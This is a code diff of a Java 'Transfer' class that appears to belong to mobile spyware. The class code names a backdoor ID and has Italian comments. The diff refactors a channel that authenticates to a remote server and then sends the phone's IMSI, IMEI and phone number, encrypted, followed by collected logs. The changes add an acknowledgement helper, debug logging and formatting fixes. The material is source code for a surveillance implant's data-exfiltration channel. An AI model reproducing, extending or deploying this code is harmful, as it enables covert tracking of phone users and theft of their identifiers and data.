@@ -60,7 +60,7 @@ public class Transfer {
 	 */
 	protected Transfer() {
 		logCollector = LogCollector.getInstance();
-		crypto = new Encryption();	
+		crypto = new Encryption();
 	}
 
 	/**
@@ -159,12 +159,14 @@ public class Transfer {
 	protected void sendIds() throws ProtocolException {
 
 		Device device = Device.getInstance();
+		device.refreshData();
 
-		sendCryptoCommand(Proto.VERSION, device.getVersion());
-		sendCryptoCommand(Proto.SUBTYPE, device.getSubtype());
-		sendCryptoCommand(Proto.ID, Keys.getBackdoorId());
-		sendCryptoCommand(Proto.INSTANCE, Keys.getInstanceId());
-		sendCryptoCommand(Proto.USERID, device.getImsi());
+		sendCryptoCommand(Proto.VERSION, Device.getVersion());    //4
+		sendCryptoCommand(Proto.SUBTYPE, Device.getSubtype());    //2
+		sendCryptoCommand(Proto.ID, Keys.getBuildId());        //16
+		sendCryptoCommand(Proto.INSTANCE, Keys.getInstanceId());  //20
+		
+		sendCryptoCommand(Proto.USERID, device.getImsi());        
 		sendCryptoCommand(Proto.DEVICEID, device.getImei());
 		sendCryptoCommand(Proto.SOURCEID, device.getPhoneNumber());
 
@@ -173,14 +175,12 @@ public class Transfer {
 	protected void sendCryptoCommand(int commandId, byte[] plain)
 			throws ProtocolException {
 
+		debug.info("Sending Crypto Command: "+commandId);
+		
 		byte[] cyphered = crypto.EncryptData(plain);
 
 		sendCommand(commandId, Utils.intToByteArray(plain.length));
-		Command ok = recvCommand();
-		if (ok == null || ok.id != Proto.OK) {
-			throw new ProtocolException("sendCryptoCommand error, id:"
-					+ commandId);
-		}
+		waitForOK();
 
 		boolean sent = false;
 		try {
@@ -189,11 +189,14 @@ public class Transfer {
 		}
 
 		if (!sent) {
-			throw new ProtocolException("sendCryptoCommand cannot send, id:"
+			throw new ProtocolException("sendCryptoCommand cannot send"
 					+ commandId);
 		}
+		
+		waitForOK();
 
 	}
+
 
 	protected void sendResponse() throws ProtocolException {
 		Check.requires(challenge != null, "null crypto challange");
@@ -202,8 +205,10 @@ public class Transfer {
 
 		// challange contiene il challange cifrato, pronto per spedizione
 		if (!sendCommand(Proto.RESPONSE, challenge)) {
-			throw new ProtocolException("getChallenge: cannot send response");
+			throw new ProtocolException("sendResponse: cannot send response");
 		}
+
+		waitForOK();
 	}
 
 	protected void getChallenge() throws ProtocolException {
@@ -218,8 +223,8 @@ public class Transfer {
 
 		// e' arrivato il challange, leggo il contenuto
 		if (command != null && command.id == Proto.CHALLENGE) {
-			fillPayload(command,16);
-			
+			fillPayload(command, 16);
+
 			if (command.size() != 16) {
 				debug.error("getChallenge: expecting 16 bytes");
 				throw new ProtocolException("getChallenge: expecting 16 bytes");
@@ -244,7 +249,7 @@ public class Transfer {
 
 		// e' arrivato il response, leggo il contenuto
 		if (command != null && command.id == Proto.RESPONSE) {
-			fillPayload(command,16);
+			fillPayload(command, 16);
 			if (command.size() != 16) {
 				throw new ProtocolException("getResponse: expecting 16 bytes");
 			}
@@ -253,6 +258,9 @@ public class Transfer {
 			if (!Arrays.equals(cryptoChallenge, command.payload)) {
 				throw new ProtocolException(
 						"getResponse: challange does not match");
+			} else {
+				debug.info("Response OK");
+				sendCommand(Proto.OK);
 			}
 
 		} else {
@@ -270,7 +278,7 @@ public class Transfer {
 
 		for (int i = 0; i < 16; i++) {
 			challenge[i] = (byte) random.nextInt();
-		}		
+		}
 
 		if (!sendCommand(Proto.CHALLENGE, challenge)) {
 			throw new ProtocolException("sendChallenge: cannot send");
@@ -292,10 +300,7 @@ public class Transfer {
 		}
 
 		sendCommand(Proto.LOG_END);
-		Command rec = recvCommand();
-		if (rec.id != Proto.OK) {
-			throw new ProtocolException("syncLogs: cannot end log");
-		}
+		waitForOK();
 
 		// connection.disconnect();
 	}
@@ -381,11 +386,19 @@ public class Transfer {
 		return command;
 	}
 
-	protected void fillPayload(Command command, int len) throws ProtocolException {
+	private void waitForOK() throws ProtocolException {
+		Command ok = recvCommand();
+		if (ok == null || ok.id != Proto.OK) {
+			throw new ProtocolException("sendCryptoCommand error");
+		}
+	}
+	
+	protected void fillPayload(Command command, int len)
+			throws ProtocolException {
 		Check.ensures(command != null, "command null");
-		Check.ensures(len > 0 && len < 65536 , "wrong len: " + len);
+		Check.ensures(len > 0 && len < 65536, "wrong len: " + len);
 
-		try {	
+		try {
 			command.payload = connection.receive(len);
 		} catch (IOException e) {
 			debug.error("receiving command: " + e);
